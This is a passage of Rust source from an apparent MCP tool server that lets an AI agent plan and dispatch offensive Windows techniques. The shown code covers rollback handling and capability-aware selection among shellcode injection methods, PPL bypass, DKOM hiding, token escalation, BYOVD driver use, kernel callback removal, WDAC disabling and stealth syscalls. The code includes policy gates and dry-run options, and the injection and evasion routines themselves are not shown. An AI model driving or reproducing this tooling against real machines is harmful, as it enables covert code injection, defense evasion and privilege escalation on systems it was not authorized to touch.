                "reason": "no executable rollback action is available",
                "rollback": step["rollback"],
            }));
            continue;
        };

        let tool = action
            .get("tool")
            .and_then(|value| value.as_str())
            .unwrap_or("");
        let action_name = action
            .get("action")
            .and_then(|value| value.as_str())
            .unwrap_or("");
        let mut args = action.get("args").cloned().unwrap_or_else(|| json!({}));
        if let Some(obj) = args.as_object_mut() {
            obj.entry("action".to_string())
                .or_insert_with(|| json!(action_name));
            obj.entry("chain_id".to_string())
                .or_insert_with(|| json!(chain_id));
            if let Some(task_id) = parent_args.get("task_id") {
                obj.entry("task_id".to_string())
                    .or_insert_with(|| task_id.clone());
            }
            if let Some(timeout_ms) = parent_args.get("timeout_ms") {
                obj.entry("timeout_ms".to_string())
                    .or_insert_with(|| timeout_ms.clone());
            }
        }

        if let Ok(runtime) = &runtime {
            if let Err(error) = runtime.check() {
                results.push(json!({
                    "id": step["id"],
                    "status": "cancelled",
                    "tool": tool,
                    "action": action_name,
                    "reason": error,
                }));
                break;
            }
        }

        match crate::mcp::tool_call::call_tool(tool, args) {
            Ok(result) => results.push(json!({
                "id": step["id"],
                "status": "executed",
                "tool": tool,
                "action": action_name,
                "result": result,
            })),
            Err(error) => results.push(json!({
                "id": step["id"],
                "status": "failed",
                "tool": tool,
                "action": action_name,
                "error": error.to_string(),
            })),
        }
    }

    json!({
        "triggered": true,
        "reason": "required_step_failed",
        "order": plan["order"].clone(),
        "steps": results,
        "plan": plan,
        "summary": rollback_summary(&results),
    })
}

fn dependency_aware_rollback_plan(executed_steps: &[Value], dag: &Value) -> Value {
    use std::collections::{BTreeMap, BTreeSet};

    let executed_ids = executed_steps
        .iter()
        .filter_map(|step| step["id"].as_str().map(str::to_string))
        .collect::<BTreeSet<_>>();
    let executed_by_id = executed_steps
        .iter()
        .filter_map(|step| Some((step["id"].as_str()?.to_string(), step.clone())))
        .collect::<BTreeMap<_, _>>();
    let execution_order = dag["execution_order"]
        .as_array()
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item.as_str().map(str::to_string))
                .collect::<Vec<_>>()
        })
        .unwrap_or_else(|| {
            executed_steps
                .iter()
                .filter_map(|step| step["id"].as_str().map(str::to_string))
                .collect()
        });

    let mut order = execution_order
        .into_iter()
        .filter(|id| executed_ids.contains(id))
        .collect::<Vec<_>>();
    order.reverse();

    let steps = order
        .iter()
        .filter_map(|id| executed_by_id.get(id))
        .map(|step| {
            let rollback = step["rollback"].clone();
            let executable = rollback_action_from_metadata(&rollback);
            json!({
                "id": step["id"],
                "tool": step["tool"],
                "action": step["action"],
                "rollback": rollback,
                "executable": executable.is_some(),
                "rollback_action": executable,
            })
        })
        .collect::<Vec<_>>();

    json!({
        "schema": "memoric.orchestration.rollback.v1",
        "strategy": "reverse_dependency_order",
        "order": order,
        "steps": steps,
        "skips_irreversible": true,
    })
}

fn rollback_action_from_step(step: &Value) -> Option<Value> {
    step.get("rollback_action")
        .cloned()
        .or_else(|| rollback_action_from_metadata(&step["rollback"]))
}

fn rollback_action_from_metadata(rollback: &Value) -> Option<Value> {
    if let Some(action) = rollback.get("action") {
        return Some(action.clone());
    }
    if rollback.get("available").and_then(|value| value.as_bool()) != Some(true) {
        return None;
    }
    match rollback.get("strategy").and_then(|value| value.as_str()) {
        Some("free_allocated_region") => Some(json!({
            "tool": "memory",
            "action": "free",
            "args": rollback.get("args").cloned().unwrap_or_else(|| json!({}))
        })),
        Some("driver_unload") => Some(json!({
            "tool": "kernel",
            "action": "driver_unload",
            "args": rollback.get("args").cloned().unwrap_or_else(|| json!({}))
        })),
        _ => None,
    }
}

fn rollback_summary(results: &[Value]) -> String {
    let executed = results
        .iter()
        .filter(|result| result["status"] == "executed")
        .count();
    let failed = results
        .iter()
        .filter(|result| result["status"] == "failed")
        .count();
    let skipped = results
        .iter()
        .filter(|result| result["status"] == "skipped")
        .count();
    format!(
        "Rollback processed {} step(s): {} executed, {} failed, {} skipped",
        results.len(),
        executed,
        failed,
        skipped
    )
}

fn has_param(args: &Value, key: &str) -> bool {
    args.get(key).is_some_and(|value| {
        !value.is_null()
            && value
                .as_str()
                .map(|text| !text.trim().is_empty())
                .unwrap_or(true)
    })
}

fn has_any_param(args: &Value, keys: &[&str]) -> bool {
    keys.iter().any(|key| has_param(args, key))
}

fn assessment_evidence(
    kind: &str,
    subject: &str,
    method: &str,
    confidence: f64,
    raw_evidence_summary: Value,
) -> Value {
    json!({
        "kind": kind,
        "subject": subject,
        "method": method,
        "confidence": confidence,
        "timestamp": crate::state::chrono_now_public(),
        "raw_evidence_summary": raw_evidence_summary,
    })
}

fn threat_confidence(
    threat_level: ThreatLevel,
    security_product_evidence_count: usize,
    kernel_indicator_count: usize,
) -> f64 {
    if kernel_indicator_count > 0 {
        return 0.9;
    }
    if security_product_evidence_count > 0 {
        return match threat_level {
            ThreatLevel::Low => 0.65,
            ThreatLevel::Medium => 0.75,
            ThreatLevel::High => 0.8,
            ThreatLevel::Critical => 0.9,
        };
    }
    0.55
}

fn planner_decision(
    tool: &str,
    action: &str,
    step_args: &Value,
    capability_matrix: &Value,
) -> Value {
    let traits = crate::mcp::action_registry::classify_action(tool, action);
    let decision_args = planner_policy_args(action, step_args);
    let policy = crate::policy::evaluate_tool_call(tool, &decision_args);
    let capability_blockers =
        capability_blockers(tool, action, &decision_args, traits, capability_matrix);
    let include = policy.allowed && capability_blockers.is_empty();
    let skip_reason = if include {
        "included".to_string()
    } else {
        planner_skip_reason(&policy, &capability_blockers)
    };

    json!({
        "status": if include { "included" } else { "blocked" },
        "include_in_effective_plan": include,
        "skip_reason": skip_reason,
        "read_only": traits.read_only,
        "state_changing": traits.state_changing,
        "requires_target": traits.requires_target,
        "risk": traits.risk.as_str(),
        "required_policy": traits.required_policy.as_str(),
        "policy": policy.as_json(),
        "capabilities": {
            "blockers": capability_blockers,
            "summary": planner_capability_summary(capability_matrix),
        },
        "selection": planner_technique_selection(tool, action, &decision_args, traits, capability_matrix),
        "alternatives": planner_alternatives(tool, action, &decision_args, traits, &policy),
    })
}

fn planner_policy_args(action: &str, step_args: &Value) -> Value {
    let mut args = step_args.clone();
    if let Some(obj) = args.as_object_mut() {
        obj.entry("action".to_string())
            .or_insert_with(|| json!(action));
        return args;
    }

    json!({ "action": action })
}

fn capability_blockers(
    tool: &str,
    action: &str,
    args: &Value,
    traits: crate::mcp::action_registry::ActionTraits,
    capability_matrix: &Value,
) -> Vec<Value> {
    let dry_run = args
        .get("dry_run")
        .and_then(|value| value.as_bool())
        .unwrap_or(false);
    if dry_run {
        return Vec::new();
    }

    let mut blockers = Vec::new();
    let platform_supported = capability_matrix["platform"]["supported"]
        .as_bool()
        .unwrap_or(false);
    if !platform_supported && !matches!(tool, "memoric" | "self" | "orchestrate") {
        blockers.push(json!({
            "code": "unsupported_platform",
            "message": capability_matrix["platform"]["message"]
                .as_str()
                .unwrap_or("Windows-only operation on unsupported platform"),
            "alternative": "Use self(action='doctor') or resources/read(uri='memoric://capabilities') for host diagnostics."
        }));
    }

    let driver_device_reachable = capability_matrix["driver"]["readiness"]["kernel_actions_ready"]
        .as_bool()
        .unwrap_or(false);
    let driver_load_possible = capability_matrix["driver"]["readiness"]["driver_load_possible"]
        .as_bool()
        .unwrap_or(false);
    let probe_only_kernel = matches!(
        action,
        "driver_discover" | "driver_stats" | "driver_hypervisor_detect"
    );
    if traits.kernel && !probe_only_kernel && !driver_device_reachable && !driver_load_possible {
        blockers.push(json!({
            "code": "driver_unavailable",
            "message": capability_matrix["driver"]["message"]
                .as_str()
                .unwrap_or("Kernel operation requires driver readiness"),
            "alternative": "Run self(action='doctor') or kernel(action='driver_discover') before planning kernel steps."
        }));
    }

    let elevated = capability_matrix["privilege"]["elevated"]
        .as_bool()
        .unwrap_or(false);
    if traits.privileged && traits.state_changing && !traits.kernel && !elevated {
        blockers.push(json!({
            "code": "not_elevated",
            "message": "Privileged state-changing operation requires an elevated process.",
            "alternative": "Keep the plan read-only with privilege(action='check') or rerun in an authorized elevated lab session."
        }));
    }

    blockers
}

fn planner_skip_reason(
    policy: &crate::policy::PolicyDecision,
    capability_blockers: &[Value],
) -> String {
    let mut reasons = Vec::new();
    if !policy.allowed {
        reasons.push(policy.reason.clone());
    }
    reasons.extend(
        capability_blockers
            .iter()
            .filter_map(|blocker| blocker["message"].as_str().map(str::to_string)),
    );

    if reasons.is_empty() {
        "blocked by planner".to_string()
    } else {
        reasons.join("; ")
    }
}

fn planner_capability_summary(capability_matrix: &Value) -> Value {
    json!({
        "platform_supported": capability_matrix["platform"]["supported"].as_bool().unwrap_or(false),
        "platform": capability_matrix["platform"]["message"].clone(),
        "elevated": capability_matrix["privilege"]["elevated"].as_bool().unwrap_or(false),
        "debug_privilege_enabled": capability_matrix["privilege"]["debug"]["enabled"].as_bool().unwrap_or(false),
        "driver_device_reachable": capability_matrix["driver"]["readiness"]["kernel_actions_ready"].as_bool().unwrap_or(false),
        "driver_load_possible": capability_matrix["driver"]["readiness"]["driver_load_possible"].as_bool().unwrap_or(false),
        "driver_message": capability_matrix["driver"]["message"].clone(),
    })
}

fn planner_technique_selection(
    tool: &str,
    action: &str,
    args: &Value,
    traits: crate::mcp::action_registry::ActionTraits,
    capability_matrix: &Value,
) -> Value {
    if let Some(selection) = kernel_technique_selection(tool, action, args, capability_matrix) {
        return selection;
    }
    if let Some(selection) = inject_technique_selection(tool, action, args, capability_matrix) {
        return selection;
    }
    if let Some(selection) =
        stealth_technique_selection(tool, action, args, traits, capability_matrix)
    {
        return selection;
    }

    json!({
        "kind": "none",
        "status": "no_equivalent_methods",
        "applies_to_dispatch": false,
        "reason": "No capability-equivalent method family is registered for this planner step.",
        "evidence": planner_selection_evidence(capability_matrix),
        "candidates": [],
        "selected": Value::Null,
    })
}

fn kernel_technique_selection(
    tool: &str,
    action: &str,
    args: &Value,
    capability_matrix: &Value,
) -> Option<Value> {
    if tool != "kernel" {
        return None;
    }

    let platform_supported = capability_bool(capability_matrix, &["platform", "supported"]);
    let elevated = capability_bool(capability_matrix, &["privilege", "elevated"]);
    let driver_ready = capability_bool(
        capability_matrix,
        &["driver", "readiness", "kernel_actions_ready"],
    );
    let driver_load_possible = capability_bool(
        capability_matrix,
        &["driver", "readiness", "driver_load_possible"],
    );
    let explicit_device_path = has_non_empty_str(args, "device_path");
    let evidence = planner_selection_evidence(capability_matrix);

    if matches!(action, "ppl_bypass" | "dkom_hide" | "token_escalate") {
        let candidates = vec![
            selection_candidate(
                "kernel",
                action,
                "byovd_explicit",
                1,
                explicit_device_path && platform_supported && elevated,
                candidate_blockers(
                    platform_supported,
                    elevated,
                    true,
                    true,
                    "driver_unavailable",
                )
                .into_iter()
                .chain(if explicit_device_path {
                    Vec::new()
                } else {
                    vec!["requires_explicit_device_path".to_string()]
                })
                .collect(),
                json!({
                    "device_path_provided": explicit_device_path,
                    "driver_source": "byovd",
                }),
                "Use the explicitly provided BYOVD device path for the hybrid kernel action.",
            ),
            selection_candidate(
                "kernel",
                action,
                "memoric_driver",
                2,
                driver_ready && platform_supported && elevated,
                candidate_blockers(
                    platform_supported,
                    elevated,
                    true,
                    driver_ready,
                    "driver_unavailable",
                ),
                json!({
                    "driver_source": "memoric",
                    "kernel_actions_ready": driver_ready,
                }),
                "Use the already reachable memoric.sys device.",
            ),
            selection_candidate(
                "kernel",
                action,
                "memoric_driver_auto_load",
                3,
                !driver_ready && driver_load_possible && platform_supported && elevated,
                candidate_blockers(
                    platform_supported,
                    elevated,
                    true,
                    driver_load_possible || driver_ready,
                    "driver_load_not_ready",
                ),
                json!({
                    "driver_source": "memoric",
                    "kernel_actions_ready": driver_ready,
                    "driver_load_possible": driver_load_possible,
                }),
                "Load or ensure memoric.sys before running the hybrid kernel action.",
            ),
        ];
        let preferred = if explicit_device_path {
            &[
                "byovd_explicit",
                "memoric_driver",
                "memoric_driver_auto_load",
            ][..]
        } else {
            &[
                "memoric_driver",
                "memoric_driver_auto_load",
                "byovd_explicit",
            ][..]
        };
        return Some(build_method_selection(
            "kernel_driver_source",
            "device_path",
            explicit_device_path.then_some("byovd_explicit"),
            preferred,
            candidates,
            evidence,
            "Hybrid kernel actions can use memoric.sys or an explicit BYOVD device; this records the capability-based recommendation without changing dispatch.",
        ));
    }

    if is_memoric_driver_action(action) {
        let candidates = vec![
            selection_candidate(
                "kernel",
                action,
                "memoric_driver",
                1,
                driver_ready && platform_supported && elevated,
                candidate_blockers(
                    platform_supported,
                    elevated,
                    true,
                    driver_ready,
                    "driver_unavailable",
                ),
                json!({
                    "driver_source": "memoric",
                    "kernel_actions_ready": driver_ready,
                }),
                "Run through the reachable memoric.sys device.",
            ),
            selection_candidate(
                "kernel",
                action,
                "memoric_driver_auto_load",
                2,
                !driver_ready && driver_load_possible && platform_supported && elevated,
                candidate_blockers(
                    platform_supported,
                    elevated,
                    true,
                    driver_load_possible || driver_ready,
                    "driver_load_not_ready",
                ),
                json!({
                    "driver_source": "memoric",
                    "driver_load_possible": driver_load_possible,
                }),
                "Prepare memoric.sys before running the driver-backed action.",
            ),
        ];
        return Some(build_method_selection(
            "kernel_driver_source",
            "driver",
            None,
            &["memoric_driver", "memoric_driver_auto_load"],
            candidates,
            evidence,
            "Driver-backed kernel actions require memoric.sys readiness; this records whether the live device or a load step is the viable path.",
        ));
    }

    if matches!(action, "driver_load" | "driver_auto") {
        let candidates = vec![selection_candidate(
            "kernel",
            action,
            "memoric_driver_load",
            1,
            driver_load_possible && platform_supported && elevated,
            candidate_blockers(
                platform_supported,
                elevated,
                true,
                driver_load_possible,
                "driver_load_not_ready",
            ),
            json!({
                "driver_source": "memoric",
                "driver_load_possible": driver_load_possible,
            }),
            "Load the bundled memoric.sys driver when signing and host readiness allow it.",
        )];
        return Some(build_method_selection(
            "kernel_driver_source",
            "driver",
            None,
            &["memoric_driver_load"],
            candidates,
            evidence,
            "Driver load planning is based on elevation, payload, signing, and HVCI readiness evidence.",
        ));
    }

    if is_explicit_byovd_action(action) {
        let candidates = vec![selection_candidate(
            "kernel",
            action,
            "byovd_explicit",
            1,
            explicit_device_path && platform_supported && elevated,
            candidate_blockers(
                platform_supported,
                elevated,
                true,
                true,
                "driver_unavailable",
            )
            .into_iter()
            .chain(if explicit_device_path {
                Vec::new()
            } else {
                vec!["requires_explicit_device_path".to_string()]
            })
            .collect(),
            json!({
                "device_path_provided": explicit_device_path,
                "driver_source": "byovd",
            }),
            "This kernel action is BYOVD-style and requires an explicit device_path plus IOCTL metadata.",
        )];
        return Some(build_method_selection(
            "kernel_driver_source",
            "device_path",
            explicit_device_path.then_some("byovd_explicit"),
            &["byovd_explicit"],
            candidates,
            evidence,
            "Explicit BYOVD actions do not have an automatic memoric.sys dispatch fallback.",
        ));
    }

    None
}

fn inject_technique_selection(
    tool: &str,
    action: &str,
    args: &Value,
    capability_matrix: &Value,
) -> Option<Value> {
    if tool != "inject" || action != "shellcode" {
        return None;
    }

    let platform_supported = capability_bool(capability_matrix, &["platform", "supported"]);
    let elevated = capability_bool(capability_matrix, &["privilege", "elevated"]);
    let debug_enabled = capability_bool(capability_matrix, &["privilege", "debug", "enabled"]);
    let driver_ready = capability_bool(
        capability_matrix,
        &["driver", "readiness", "kernel_actions_ready"],
    );
    let evidence = planner_selection_evidence(capability_matrix);
    let user_mode_blockers = candidate_blockers(
        platform_supported,
        elevated,
        true,
        true,
        "driver_unavailable",
    );
    let debug_blockers = if debug_enabled {
        user_mode_blockers.clone()
    } else {
        let mut blockers = user_mode_blockers.clone();
        blockers.push("debug_privilege_disabled".to_string());
        blockers
    };
    let kernel_blockers = candidate_blockers(
        platform_supported,
        elevated,
        true,
        driver_ready,
        "driver_unavailable",
    );

    let candidates = vec![
        selection_candidate(
            "inject",
            "shellcode",
            "thread",
            1,
            user_mode_blockers.is_empty(),
            user_mode_blockers.clone(),
            json!({"requires_driver": false, "debug_privilege_enabled": debug_enabled}),
            "Default user-mode remote thread path.",
        ),
        selection_candidate(
            "inject",
            "shellcode",
            "apc",
            2,
            user_mode_blockers.is_empty(),
            user_mode_blockers.clone(),
            json!({"requires_driver": false, "target_thread_state": "planner_unknown"}),
            "User-mode APC path when target thread behavior is compatible.",
        ),
        selection_candidate(
            "inject",
            "shellcode",
            "special_apc",
            3,
            debug_blockers.is_empty(),
            debug_blockers.clone(),
            json!({"requires_driver": false, "debug_privilege_enabled": debug_enabled}),
            "Special APC path when token/debug privilege evidence is favorable.",
        ),
        selection_candidate(
            "inject",
            "shellcode",
            "threadless",
            4,
            user_mode_blockers.is_empty(),
            user_mode_blockers.clone(),
            json!({"requires_driver": false, "requires_restore_metadata": true}),
            "Threadless patch path with rollback-sensitive restore metadata.",
        ),
        selection_candidate(
            "kernel",
            "driver_apc_inject",
            "kernel_driver_apc",
            5,
            kernel_blockers.is_empty(),
            kernel_blockers,
            json!({"requires_driver": true, "kernel_actions_ready": driver_ready}),
            "Driver-backed APC injection fallback when kernel capability evidence is ready.",
        ),
    ];

    let requested = args.get("method").and_then(|value| value.as_str());
    Some(build_method_selection(
        "injection_method",
        "method",
        requested,
        &[
            "thread",
            "apc",
            "special_apc",
            "threadless",
            "kernel_driver_apc",
        ],
        candidates,
        evidence,
        "Shellcode injection has equivalent user-mode and driver-backed families; this records capability-aware candidates without changing dispatch.",
    ))
}

fn stealth_technique_selection(
    tool: &str,
    action: &str,
    args: &Value,
    traits: crate::mcp::action_registry::ActionTraits,
    capability_matrix: &Value,
) -> Option<Value> {
    if tool != "stealth" {
        return None;
    }

    let platform_supported = capability_bool(capability_matrix, &["platform", "supported"]);
    let elevated = capability_bool(capability_matrix, &["privilege", "elevated"]);
    let driver_ready = capability_bool(
        capability_matrix,
        &["driver", "readiness", "kernel_actions_ready"],
    );
    let evidence = planner_selection_evidence(capability_matrix);

    if matches!(
        action,
        "syscall_write" | "syscall_alloc" | "syscall_protect" | "syscall_read" | "syscall_thread"
    ) {
        let requires_elevation = traits.state_changing;
        let blockers = candidate_blockers(
            platform_supported,
            elevated,
            requires_elevation,
            true,
            "driver_unavailable",
        );
        let candidates = vec![
            selection_candidate(
                "stealth",
                action,
                "direct",
                1,
                blockers.is_empty(),
                blockers.clone(),
                json!({"requires_driver": false}),
                "Direct syscall method.",
            ),
            selection_candidate(
                "stealth",
                action,
                "indirect",
                2,
                blockers.is_empty(),
                blockers.clone(),
                json!({"requires_driver": false}),
                "Indirect syscall method for environments where direct stubs are less suitable.",
            ),
            selection_candidate(
                "stealth",
                action,
                "int2e",
                3,
                blockers.is_empty(),
                blockers,
                json!({"requires_driver": false}),
                "Legacy int2e-style syscall path where supported.",
            ),
        ];
        return Some(build_method_selection(
            "stealth_syscall_method",
            "syscall_method",
            args.get("syscall_method").and_then(|value| value.as_str()),
            &["direct", "indirect", "int2e"],
            candidates,
            evidence,
            "Syscall stealth methods are equivalent execution families selected from platform and privilege evidence.",
        ));
    }

    if matches!(action, "wdac_disable" | "wdac_restore") {
        let user_mode_blockers = candidate_blockers(
            platform_supported,
            elevated,
            true,
            true,
            "driver_unavailable",
        );
        let driver_blockers = candidate_blockers(
            platform_supported,
            elevated,
            true,
            driver_ready,
            "driver_unavailable",
        );
        let any_user_mode = user_mode_blockers.is_empty();
        let any_driver = driver_blockers.is_empty();
        let candidates = vec![
            selection_candidate(
                "stealth",
                action,
                "driver_ci",
                1,
                any_driver,
                driver_blockers.clone(),
                json!({"requires_driver": true, "kernel_actions_ready": driver_ready}),
                "Driver-backed code-integrity method.",
            ),
            selection_candidate(
                "stealth",
                action,
                "kernel_rw",
                2,
                any_driver,
                driver_blockers.clone(),
                json!({"requires_driver": true, "kernel_actions_ready": driver_ready}),
                "Kernel read/write backed policy method.",
            ),
            selection_candidate(
                "stealth",
                action,
                "registry",
                3,
                any_user_mode,
                user_mode_blockers.clone(),
                json!({"requires_driver": false}),
                "Registry-backed policy method.",
            ),
            selection_candidate(
                "stealth",
                action,
                "wmi",
                4,
                any_user_mode,
                user_mode_blockers.clone(),
                json!({"requires_driver": false}),
                "WMI-backed policy method.",
            ),
            selection_candidate(
                "stealth",
                action,
                "auto",
                5,
                any_driver || any_user_mode,
                if any_driver || any_user_mode {
                    Vec::new()
                } else {
                    user_mode_blockers
                },
                json!({"requires_driver": "optional", "kernel_actions_ready": driver_ready}),
                "Let the handler choose among registered policy methods.",
            ),
        ];
        return Some(build_method_selection(
            "stealth_policy_method",
            "method",
            args.get("method").and_then(|value| value.as_str()),
            &["driver_ci", "kernel_rw", "registry", "wmi", "auto"],
            candidates,
            evidence,
            "Policy stealth methods have user-mode and kernel-backed variants; planner records the capability-aware recommendation only.",
        ));
    }

    None
}

fn build_method_selection(
    kind: &str,
    parameter: &str,
    requested: Option<&str>,
    preferred: &[&str],
    candidates: Vec<Value>,
    evidence: Value,
    reason: &str,
) -> Value {
    if candidates.is_empty() {
        return json!({
            "kind": kind,
            "status": "no_equivalent_methods",
            "parameter": parameter,
            "requested": requested,
            "selected": Value::Null,
            "candidates": [],
            "evidence": evidence,
            "applies_to_dispatch": false,
            "reason": reason,
        });
    }

    let requested_candidate = requested.and_then(|method| {
        candidates
            .iter()
            .find(|candidate| candidate["method"].as_str() == Some(method))
            .cloned()
    });
    let requested_available = requested_candidate
        .as_ref()
        .and_then(|candidate| candidate["available"].as_bool())
        .unwrap_or(false);
    let recommended = if requested_available {
        requested_candidate.clone()
    } else {
        first_available_candidate(&candidates, preferred)
    };

    let (status, selected) = if let Some(candidate) = requested_candidate {
        if requested_available {
            (
                "selected",
                Some(mark_selected(candidate, "explicit_request")),
            )
        } else if let Some(fallback) = recommended {
            (
                "fallback_recommended",
                Some(mark_selected(fallback, "capability_fallback")),
            )
        } else {
            (
                "requested_method_blocked",
                Some(mark_selected(candidate, "blocked_request")),
            )
        }
    } else if requested.is_some() {
        if let Some(fallback) = recommended {
            (
                "fallback_recommended",
                Some(mark_selected(fallback, "unknown_request_fallback")),
            )
        } else {
            ("requested_method_unknown", None)
        }
    } else if let Some(candidate) = recommended {
        (
            "selected",
            Some(mark_selected(candidate, "capability_recommendation")),
        )
    } else {
        ("no_available_candidate", None)
    };

    json!({
        "kind": kind,
        "status": status,
        "parameter": parameter,
        "requested": requested,
        "selected": selected.unwrap_or(Value::Null),
        "candidates": candidates,
        "evidence": evidence,
        "applies_to_dispatch": false,
        "reason": reason,
    })
}

fn apply_live_planner_selection(
    tool: &str,
    action: &str,
    step_args: &mut Value,
    live_planner: &mut Value,
) -> Result<(), String> {
    let Some(selection) = live_planner
        .get_mut("selection")
        .and_then(|value| value.as_object_mut())
    else {
        return Ok(());
    };

    let status = selection
        .get("status")
        .and_then(|value| value.as_str())
        .unwrap_or("none");
    if status != "fallback_recommended" {
        selection.insert(
            "dispatch_application".to_string(),
            json!({
                "applied": false,
                "reason": "no capability fallback required for live dispatch"
            }),
        );
        return Ok(());
    }

    let parameter = selection
        .get("parameter")
        .and_then(|value| value.as_str())
        .unwrap_or("")
        .to_string();
    let selected = selection.get("selected").cloned().unwrap_or(Value::Null);
    let selected_tool = selected["tool"].as_str().unwrap_or("");
    let selected_action = selected["action"].as_str().unwrap_or("");
    let selected_method = selected["method"].as_str().unwrap_or("");

    if selected_tool != tool || selected_action != action {
        let reason = format!(
            "capability fallback selected {}(action='{}', method='{}') for {}(action='{}'); live dispatch cannot safely rewrite across tool/action boundaries",
            selected_tool, selected_action, selected_method, tool, action
        );
        selection.insert("applies_to_dispatch".to_string(), json!(false));
        selection.insert(
            "dispatch_application".to_string(),
            json!({
                "applied": false,
                "reason": reason,
                "requires_cross_tool_action_mapping": true,
            }),
        );
        return Err(reason);
    }

    let Some(choice_values) = crate::mcp::action_registry::choice_values(tool, action, &parameter)
    else {
        let reason = format!(
            "capability fallback parameter '{}' is not a registry choice for {}(action='{}')",
            parameter, tool, action
        );
        selection.insert("applies_to_dispatch".to_string(), json!(false));
        selection.insert(
            "dispatch_application".to_string(),
            json!({
                "applied": false,
                "reason": reason,
            }),
        );
        return Err(reason);
    };
    if !choice_values.contains(&selected_method) {
        let reason = format!(
            "capability fallback value '{}' is not a registered {} choice for {}(action='{}')",
            selected_method, parameter, tool, action
        );
        selection.insert("applies_to_dispatch".to_string(), json!(false));
        selection.insert(
            "dispatch_application".to_string(),
            json!({
                "applied": false,
                "reason": reason,
            }),
        );
        return Err(reason);
    }

    let Some(args) = step_args.as_object_mut() else {
        let reason =
            "live dispatch arguments must be an object before applying capability fallback"
                .to_string();
        selection.insert("applies_to_dispatch".to_string(), json!(false));
        selection.insert(
            "dispatch_application".to_string(),
            json!({
                "applied": false,
                "reason": reason,
            }),
        );
        return Err(reason);
    };
    let original_requested = selection.get("requested").cloned().unwrap_or(Value::Null);
    args.insert(parameter.clone(), json!(selected_method));
    selection.insert("applies_to_dispatch".to_string(), json!(true));
    selection.insert(
        "dispatch_application".to_string(),
        json!({
            "applied": true,
            "parameter": parameter,
            "value": selected_method,
            "original_requested": original_requested,
            "reason": "capability fallback applied to the same tool/action before live dispatch",
        }),
    );

    Ok(())
}

fn selection_candidate(
    tool: &str,
    action: &str,
    method: &str,
    rank: usize,
    available: bool,
    blockers: Vec<String>,
    evidence: Value,
    reason: &str,
) -> Value {
    json!({
        "tool": tool,
        "action": action,
        "method": method,
        "rank": rank,
        "available": available,
        "blockers": blockers,
        "evidence": evidence,
        "reason": reason,
    })
}

fn first_available_candidate(candidates: &[Value], preferred: &[&str]) -> Option<Value> {
    for method in preferred {
        if let Some(candidate) = candidates.iter().find(|candidate| {
            candidate["method"].as_str() == Some(*method)
                && candidate["available"].as_bool().unwrap_or(false)
        }) {
            return Some(candidate.clone());
        }
    }

    candidates
        .iter()
        .find(|candidate| candidate["available"].as_bool().unwrap_or(false))
        .cloned()
}

fn mark_selected(mut candidate: Value, selection_type: &str) -> Value {
    if let Some(obj) = candidate.as_object_mut() {
        obj.insert("selection_type".to_string(), json!(selection_type));
    }
    candidate
}

fn candidate_blockers(
    platform_supported: bool,
    elevated: bool,
    requires_elevation: bool,
    dependency_ready: bool,
    dependency_code: &str,
) -> Vec<String> {
    let mut blockers = Vec::new();
    if !platform_supported {
        blockers.push("unsupported_platform".to_string());
    }
    if requires_elevation && !elevated {
        blockers.push("not_elevated".to_string());
    }
    if !dependency_ready {
        blockers.push(dependency_code.to_string());
    }
    blockers
}

fn capability_bool(value: &Value, path: &[&str]) -> bool {
    let mut current = value;
    for segment in path {
        let Some(next) = current.get(*segment) else {
            return false;
        };
        current = next;
    }
    current.as_bool().unwrap_or(false)
}

fn planner_selection_evidence(capability_matrix: &Value) -> Value {
    json!({
        "platform_supported": capability_bool(capability_matrix, &["platform", "supported"]),
        "elevated": capability_bool(capability_matrix, &["privilege", "elevated"]),
        "debug_privilege_enabled": capability_bool(capability_matrix, &["privilege", "debug", "enabled"]),
        "kernel_actions_ready": capability_bool(capability_matrix, &["driver", "readiness", "kernel_actions_ready"]),
        "driver_load_possible": capability_bool(capability_matrix, &["driver", "readiness", "driver_load_possible"]),
        "driver_message": capability_matrix["driver"]["message"].clone(),
    })
}

fn has_non_empty_str(args: &Value, field: &str) -> bool {
    args.get(field)
        .and_then(|value| value.as_str())
        .is_some_and(|value| !value.trim().is_empty())
}

fn is_memoric_driver_action(action: &str) -> bool {
    action.starts_with("driver_")
        && !matches!(
            action,
            "driver_load" | "driver_unload" | "driver_discover" | "driver_auto"
        )
}

fn is_explicit_byovd_action(action: &str) -> bool {
    matches!(
        action,
        "read"
            | "write"
            | "pte_modify"
            | "vad_hide"
            | "enum_callbacks"
            | "remove_callback"
            | "object_callback_enum"
            | "object_callback_remove"
            | "registry_callback_enum"
            | "registry_callback_remove"
    )
}

fn planner_alternatives(
    tool: &str,
    action: &str,
    args: &Value,
    traits: crate::mcp::action_registry::ActionTraits,
    policy: &crate::policy::PolicyDecision,
) -> Vec<Value> {
    let mut alternatives = Vec::new();

    if !policy.allowed && traits.state_changing {
        let mut preview_args = args.clone();
        if let Some(obj) = preview_args.as_object_mut() {
            obj.insert("dry_run".to_string(), json!(true));
        }
        alternatives.push(json!({
            "tool": tool,
            "action": action,
            "args": preview_args,
            "reason": "Preview the state-changing step without executing it."
        }));
    }

    if traits.kernel {
        alternatives.push(json!({
            "tool": "self",
            "action": "doctor",
            "args": {},
            "reason": "Inspect driver, signing, policy, and platform readiness before kernel planning."
        }));
        alternatives.push(json!({
            "tool": "kernel",
            "action": "driver_discover",
            "args": {},
            "reason": "Probe available driver candidates without loading a driver."
        }));
    } else if traits.privileged {
        alternatives.push(json!({
            "tool": "privilege",
            "action": "check",
            "args": {},
            "reason": "Inspect current token and elevation state before privileged planning."
        }));
    } else if traits.requires_target && traits.state_changing {
        alternatives.push(json!({
            "tool": "memory",
            "action": "diagnostics",
            "args": target_diagnostics_args(args),
            "reason": "Use read-only target diagnostics instead of mutation."
        }));
    }

    alternatives
}

fn target_diagnostics_args(args: &Value) -> Value {
    let mut diagnostics = serde_json::Map::new();
    if let Some(pid) = args.get("pid") {
        diagnostics.insert("pid".to_string(), pid.clone());
    }
    diagnostics.insert("include_handles".to_string(), json!(false));
    diagnostics.insert("include_entropy".to_string(), json!(false));
    Value::Object(diagnostics)
}

fn missing_required_static_params(tool: &str, action: &str, args: &Value) -> Vec<String> {
    let mut required = crate::mcp::action_registry::required_parameters(tool, action).to_vec();

    for condition in crate::mcp::action_registry::conditional_required_parameters(tool, action) {
        if condition.matches_args(args) {
            required.extend(condition.parameters.iter().copied());
        }
    }

    let mut missing = required
        .into_iter()
        .filter(|key| !has_param_with_registered_aliases(args, tool, action, key))
        .map(|key| key.to_string())
        .collect::<Vec<_>>();

    for alternative in crate::mcp::action_registry::alternative_required_parameters(tool, action) {
        if !alternative.matches_args(args) {
            continue;
        }
        let has_any = alternative
            .parameters
            .iter()
